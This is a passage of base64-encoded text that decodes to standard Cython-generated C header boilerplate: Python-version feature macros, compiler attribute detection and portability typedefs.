FGRV9NQUNST1MgMFxuICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAwXG4gICN1bmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgI2RlZmluZSBDWVRIT05fVU5QQUNLX01FVEhPRFMgMFxuICAjdW5kZWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICNkZWZpbmUgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFIDBcbiAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTFxuICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAwXG4gICN1bmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjZGVmaW5lIENZVEhPTl9NRVRIX0ZBU1RDQUxMIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApXG4gICN1bmRlZiBDWVRIT05fRkFTVF9QWUNBTExcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9QWUNBTEwgMFxuICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTU1xuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMFxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkdcbiAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIDBcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIDBcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMClcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlNcbiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAjZGVmaW5lIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgMFxuICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0NcbiAgICAjZGVmaW5lIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MgMFxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMFxuI2Vsc2VcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAxXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAwXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCAwXG4gICNpZmRlZiBQeV9HSUxfRElTQUJMRURcbiAgICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDFcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDBcbiAgICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMVxuICAjZWxpZiAhZGVmaW5lZChDWVRIT05fVVNFX1RZUEVfU0xPVFMpXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TUEVDUyAwXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUFxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMgMVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgI3VuZGVmIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDBcbiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTKVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAxXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgfHwgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBBMlxuICAgICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSIDBcbiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUilcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMFxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgI3VuZGVmIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlNcbiAgICAjZGVmaW5lIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMgMVxuICAjZWxpZiAhZGVmaW5lZChDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTKVxuICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUyAwXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAjZGVmaW5lIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFIDFcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgICN1bmRlZiBDWVRIT05fRkFTVF9HSUxcbiAgICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAwXG4gICNlbGlmICFkZWZpbmVkKENZVEhPTl9GQVNUX0dJTClcbiAgICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE2KVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAgICNkZWZpbmUgQ1lUSE9OX01FVEhfRkFTVENBTEwgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fRkFTVF9QWUNBTExcbiAgICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTU1xuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMFxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEIxKVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgMVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgI3VuZGVmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TIDBcbiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TKVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TICAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE1ICYmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURSlcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0NcbiAgICAjZGVmaW5lIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgKCFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORylcbiAgI2VuZGlmXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX0ZBU1RfUFlDQ0FMTFxuI2RlZmluZSBDWVRIT05fRkFTVF9QWUNDQUxMICBDWVRIT05fRkFTVF9QWUNBTExcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fVkVDVE9SQ0FMTFxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNkZWZpbmUgQ1lUSE9OX1ZFQ1RPUkNBTEwgIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApXG4jZWxzZVxuI2RlZmluZSBDWVRIT05fVkVDVE9SQ0FMTCAgKENZVEhPTl9GQVNUX1BZQ0NBTEwgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBCMSlcbiNlbmRpZlxuI2VuZGlmXG4jZGVmaW5lIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMIChDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwQjEpXG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICN1bmRlZiBTSElGVFxuICAjdW5kZWYgQkFTRVxuICAjdW5kZWYgTUFTS1xuICAjaWZkZWYgU0laRU9GX1ZPSURfUFxuICAgIGVudW0geyBfX3B5eF9jaGVja19zaXplb2Zfdm9pZHAgPSAxIC8gKGludCkoU0laRU9GX1ZPSURfUCA9PSBzaXplb2Yodm9pZCopKSB9O1xuICAjZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fTE9DS19BTkRfR0lMX0RFQURMT0NLX0FWT0lEQU5DRV9USU1FXG4gICNkZWZpbmUgQ1lUSE9OX0xPQ0tfQU5EX0dJTF9ERUFETE9DS19BVk9JREFOQ0VfVElNRSAxMDBcbiNlbmRpZlxuI2lmbmRlZiBfX2hhc19hdHRyaWJ1dGVcbiAgI2RlZmluZSBfX2hhc19hdHRyaWJ1dGUoeCkgMFxuI2VuZGlmXG4jaWZuZGVmIF9faGFzX2NwcF9hdHRyaWJ1dGVcbiAgI2RlZmluZSBfX2hhc19jcHBfYXR0cmlidXRlKHgpIDBcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fUkVTVFJJQ1RcbiAgI2lmIGRlZmluZWQoX19HTlVDX18pXG4gICAgI2RlZmluZSBDWVRIT05fUkVTVFJJQ1QgX19yZXN0cmljdF9fXG4gICNlbGlmIGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE0MDBcbiAgICAjZGVmaW5lIENZVEhPTl9SRVNUUklDVCBfX3Jlc3RyaWN0XG4gICNlbGlmIGRlZmluZWQgKF9fU1REQ19WRVJTSU9OX18pICYmIF9fU1REQ19WRVJTSU9OX18gPj0gMTk5OTAxTFxuICAgICNkZWZpbmUgQ1lUSE9OX1JFU1RSSUNUIHJlc3RyaWN0XG4gICNlbHNlXG4gICAgI2RlZmluZSBDWVRIT05fUkVTVFJJQ1RcbiAgI2VuZGlmXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX1VOVVNFRFxuICAjaWYgZGVmaW5lZChfX2NwbHVzcGx1cylcbiAgICBcbiAgICAjaWYgKChkZWZpbmVkKF9NU1ZDX0xBTkcpICYmIF9NU1ZDX0xBTkcgPj0gMjAxNzAzTCkgfHwgX19jcGx1c3BsdXMgPj0gMjAxNzAzTClcbiAgICAgICNpZiBfX2hhc19jcHBfYXR0cmlidXRlKG1heWJlX3VudXNlZClcbiAgICAgICAgI2RlZmluZSBDWVRIT05fVU5VU0VEIFtbbWF5YmVfdW51c2VkXV1cbiAgICAgICNlbmRpZlxuICAgICNlbmRpZlxuICAjZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fVU5VU0VEXG4jIGlmIGRlZmluZWQoX19HTlVDX18pXG4jICAgaWYgIShkZWZpbmVkKF9fY3BsdXNwbHVzKSkgfHwgKF9fR05VQ19fID4gMyB8fCAoX19HTlVDX18gPT0gMyAmJiBfX0dOVUNfTUlOT1JfXyA+PSA0KSlcbiMgICAgIGRlZmluZSBDWVRIT05fVU5VU0VEIF9fYXR0cmlidXRlX18gKChfX3VudXNlZF9fKSlcbiMgICBlbHNlXG4jICAgICBkZWZpbmUgQ1lUSE9OX1VOVVNFRFxuIyAgIGVuZGlmXG4jIGVsaWYgZGVmaW5lZChfX0lDQykgfHwgKGRlZmluZWQoX19JTlRFTF9DT01QSUxFUikgJiYgIWRlZmluZWQoX01TQ19WRVIpKVxuIyAgIGRlZmluZSBDWVRIT05fVU5VU0VEIF9fYXR0cmlidXRlX18gKChfX3VudXNlZF9fKSlcbiMgZWxzZVxuIyAgIGRlZmluZSBDWVRIT05fVU5VU0VEXG4jIGVuZGlmXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX1VOVVNFRF9WQVJcbiMgIGlmIGRlZmluZWQoX19jcGx1c3BsdXMpXG4gICAgIHRlbXBsYXRlPGNsYXNzIFQ+IHZvaWQgQ1lUSE9OX1VOVVNFRF9WQVIoIGNvbnN0IFQmICkgeyB9XG4jICBlbHNlXG4jICAgIGRlZmluZSBDWVRIT05fVU5VU0VEX1ZBUih4KSAodm9pZCkoeClcbiMgIGVuZGlmXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVJcbiAgI2RlZmluZSBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUih4KSBDWVRIT05fVU5VU0VEX1ZBUih4KVxuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9OQ1BfVU5VU0VEXG4jIGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiMgIGRlZmluZSBDWVRIT05fTkNQX1VOVVNFRFxuIyBlbHNlXG4jICBkZWZpbmUgQ1lUSE9OX05DUF9VTlVTRUQgQ1lUSE9OX1VOVVNFRFxuIyBlbmRpZlxuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9VU0VfQ1BQX1NURF9NT1ZFXG4gICNpZiBkZWZpbmVkKF9fY3BsdXNwbHVzKSAmJiAoXFxcbiAgICBfX2NwbHVzcGx1cyA+PSAyMDExMDNMIHx8IChkZWZpbmVkKF9NU0NfVkVSKSAmJiBfTVNDX1ZFUiA+PSAxNjAwKSlcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfQ1BQX1NURF9NT1ZFIDFcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfQ1BQX1NURF9NT1ZFIDBcbiAgI2VuZGlmXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfdm9pZF90b19Ob25lKHZvaWRfcmVzdWx0KSAoKHZvaWQpKHZvaWRfcmVzdWx0KSwgUHlfSU5DUkVGKFB5X05vbmUpLCBQeV9Ob25lKVxuI2lmZGVmIF9NU0NfVkVSXG4gICAgI2lmbmRlZiBfTVNDX1NURElOVF9IX1xuICAgICAgICAjaWYgX01TQ19WRVIgPCAxMzAwXG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIGNoYXIgICAgIHVpbnQ4X3Q7XG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIHNob3J0ICAgIHVpbnQxNl90O1xuICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBpbnQgICAgICB1aW50MzJfdDtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgX19pbnQ4ICAgdWludDhfdDtcbiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgX19pbnQxNiAgdWludDE2X3Q7XG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIF9faW50MzIgIHVpbnQzMl90O1xuICAgICAgICAjZW5kaWZcbiAgICAjZW5kaWZcbiAgICAjaWYgX01TQ19WRVIgPCAxMzAwXG4gICAgICAgICNpZmRlZiBfV0lONjRcbiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgbG9uZyBsb25nICBfX3B5eF91aW50cHRyX3Q7XG4gICAgICAgICNlbHNlXG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIGludCAgICAgICAgX19weXhfdWludHB0cl90O1xuICAgICAgICAjZW5kaWZcbiAgICAjZWxzZVxuICAgICAgICAjaWZkZWYgX1dJTjY0XG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIF9faW50NjQgICAgX19weXhfdWludHB0cl90O1xuICAgICAgICAjZWxzZVxuICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBfX2ludDMyICAgIF9fcHl4X3VpbnRwdHJfdDtcbiAgICAgICAgI2VuZGlmXG4gICAgI2VuZGlmXG4jZWxzZVxuICAgICNpbmNsdWRlIDxzdGRpbnQuaD5cbiAgICB0eXBlZGVmIHVpbnRwdHJfdCAgX19weXhfdWludHB0cl90O1xuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9GQUxMVEhST1VHSFxuICAjaWYgZGVmaW5lZChfX2NwbHVzcGx1cylcbiAgICBcbiAgICAjaWYgKChkZWZpbmVkKF9NU1ZDX0xBTkcpICYmIF9NU1ZDX0xBTkcgPj0gMjAxNzAzTCkgfHwgX19jcGx1c3BsdXMgPj0gMjAxNzAzTClcbiAgICAgICNpZiBfX2hhc19jcHBfYXR0cmlidXRlKGZhbGx0aHJvdWdoKVxuICAgICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSCBbW2ZhbGx0aHJvdWdoXV1cbiAgICAgICNlbmRpZlxuICAgICNlbmRpZlxuICAgICNpZm5kZWYgQ1lUSE9OX0ZBTExUSFJPVUdIXG4gICAgICAjaWYgX19oYXNfY3BwX2F0dHJpYnV0ZShjbGFuZzo6ZmFsbHRocm91Z2gpXG4gICAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdIIFtbY2xhbmc6OmZhbGx0aHJvdWdoXV1cbiAgICAgICNlbGlmIF9faGFzX2NwcF9hdHRyaWJ1dGUoZ251OjpmYWxsdGhyb3VnaClcbiAgICAgICAgI2RlZmluZSBDWVRIT05fRkFMTFRIUk9VR0ggW1tnbnU6OmZhbGx0aHJvdWdoXV1cbiAgICAgICNlbmRpZlxuICAgICNlbmRpZlxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fRkFMTFRIUk9VR0hcbiAgICAjaWYgX19oYXNfYXR0cmlidXRlKGZhbGx0aHJvdWdoKVxuICAgICAgI2RlZmluZSBDWVRIT05fRkFMTFRIUk9VR0ggX19hdHRyaWJ1dGVfXygoZmFsbHRocm91Z2gpKVxuICAgICNlbHNlXG4gICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSFxuICAgICNlbmRpZlxuICAjZW5kaWZcbiAgI2lmIGRlZmluZWQoX19jbGFuZ19fKSAmJiBkZWZpbmVkKF9fYXBwbGVfYnVpbGRfdmVyc2lvbl9fKVxuICAgICNpZiBfX2FwcGxlX2J1aWxkX3ZlcnNpb25fXyA8IDcwMDAwMDBcbiAgICAgICN1bmRlZiAgQ1lUSE9OX0ZBTExUSFJPVUdIXG4gICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSFxuICAgICNlbmRpZlxuICAjZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBQeV9VTlJFQUNIQUJMRVxuICAjZGVmaW5lIFB5X1VOUkVBQ0hBQkxFKCkgIGFzc2VydCgwKTsgYWJvcnQoKVxuI2VuZGlmXG4jaWZkZWYgX19jcGx1c3BsdXNcbiAgdGVtcGxhdGUgPHR5cGVuYW1lIFQ+XG4gIHN0cnVjdCBfX1BZWF9JU19VTlNJR05FRF9JTVBMIHtzdGF0aWMgY29uc3QgYm9vbCB2YWx1ZSA9IFQoMCkgPCBUKC0xKTt9O1xuICAjZGVmaW5lIF9fUFlYX0lTX1VOU0lHTkVEKHR5cGUpIChfX1BZWF9JU19VTlNJR05FRF9JTVBMPHR5cGU+Ojp2YWx1ZSlcbiNlbHNlXG4gICNkZWZpbmUgX19QWVhfSVNfVU5TSUdORUQodHlwZSkgKCgodHlwZSktMSkgPiAwKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZID09IDFcbiAgI2RlZmluZSBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0ICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMClcbiNlbHNlXG4gICNkZWZpbmUgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UICAoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDApXG4jZW5kaWZcbiNkZWZpbmUgX19QWVhfUkVJTlRFUlBSRVRfRlVOQ0lPTihmdW5jX3BvaW50ZXIsIG90aGVyX3BvaW50ZXIpICgoZnVuY19wb2ludGVyKSh2b2lkKCopKHZvaWQpKShvdGhlcl9wb2ludGVyKSlcblxuXG4jaWZuZGVmIENZVEhPTl9JTkxJTkVcbiAgI2lmIGRlZmluZWQoX19jbGFuZ19fKVxuICAgICNkZWZpbmUgQ1lUSE9OX0lOTElORSBfX2lubGluZV9fIF9fYXR0cmlidXRlX18gKChfX3VudXNlZF9fKSlcbiAgI2VsaWYgZGVmaW5lZChfX0dOVUNfXylcbiAgICAjZGVmaW5lIENZVEhPTl9JTkxJTkUgX19pbmxpbmVfX1xuICAjZWxpZiBkZWZpbmVkKF9NU0NfVkVSKVxuICAgICNkZWZpbmUgQ1lUSE9OX0lOTElORSBfX2lubGluZVxuICAjZWxpZiBkZWZpbmVkIChfX1NURENfVkVSU0lPTl9fKSAmJiBfX1NURENfVkVSU0lPTl9fID49IDE5OTkwMUxcbiAgICAjZGVmaW5lIENZVEhPTl9JTkxJTkUgaW5saW5lXG4gICNlbHNlXG4gICAgI2RlZmluZSBDWVRIT05fSU5MSU5FXG4gICNlbmRpZlxuI2VuZGlmXG5cblxuI2RlZmluZSBfX1BZWF9CVUlMRF9QWV9TU0laRV9UICJuIlxuI2RlZmluZSBDWVRIT05fRk9STUFUX1NTSVpFX1QgInoiXG4jZGVmaW5lIF9fUHl4X0JVSUxUSU5fTU9EVUxFX05BTUUgImJ1aWx0aW5zIlxuI2RlZmluZSBfX1B5eF9EZWZhdWx0Q2xhc3NUeXBlIFB5VHlwZV9UeXBlXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICNpZm5kZWYgQ09fT1BUSU1JWkVEXG4gICAgc3RhdGljIGludCBDT19PUFRJTUlaRUQ7XG4gICAgI2VuZGlmXG4gICAgI2lmbmRlZiBDT19ORVdMT0NBTFNcbiAgICBzdGF0aWMgaW50IENPX05FV0xPQ0FMUztcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX1ZBUkFSR1NcbiAgICBzdGF0aWMgaW50IENPX1ZBUkFSR1M7XG4gICAgI2VuZGlmXG4gICAgI2lmbmRlZiBDT19WQVJLRVlXT1JEU1xuICAgIHN0YXRpYyBpbnQgQ09fVkFSS0VZV09SRFM7XG4gICAgI2VuZGlmXG4gICAgI2lmbmRlZiBDT19BU1lOQ19HRU5FUkFUT1JcbiAgICBzdGF0aWMgaW50IENPX0FTWU5DX0dFTkVSQVRPUjtcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX0dFTkVSQVRPUlxuICAgIHN0YXRpYyBpbnQgQ09fR0VORVJBVE9SO1xuICAgICNlbmRpZlxuICAgICNpZm5kZWYgQ09fQ09ST1VUSU5FXG4gICAgc3RhdGljIGludCBDT19DT1JPVVRJTkU7XG4gICAgI2VuZGlmXG4jZWxzZVxuICAgICNpZm5kZWYgQ09fQ09ST1VUSU5FXG4gICAgICAjZGVmaW5lIENPX0NPUk9VVElORSAweDgwXG4gICAgI2VuZGlmXG4gICAgI2lmbmRlZiBDT19BU1lOQ19HRU5FUkFUT1JcbiAgICAgICNkZWZpbmUgQ09fQVNZTkNfR0VORVJBVE9SIDB4MjAwXG4gICAgI2VuZGlmXG4jZW5kaWZcbnN0YXRpYyBpbnQgX19QeXhfaW5pdF9jb192YXJpYWJsZXModm9pZCk7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDBBNCB8fCBkZWZpbmVkKFB5X0lTX1RZUEUpXG4gICNkZWZpbmUgX19QeXhfSVNfVFlQRShvYiwgdHlwZSkgUHlfSVNfVFlQRShvYiwgdHlwZSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfSVNfVFlQRShvYiwgdHlwZSkgKCgoY29uc3QgUHlPYmplY3QqKW9iKS0+b2JfdHlwZSA9PSAodHlwZSkpXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMEIxIHx8IGRlZmluZWQoUHlfSXMpXG4gICNkZWZpbmUgX19QeXhfUHlfSXMoeCwgeSkgIFB5X0lzKHgsIHkpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5X0lzKHgsIHkpICgoeCkgPT0gKHkpKVxuI2VuZGlmXG4jaW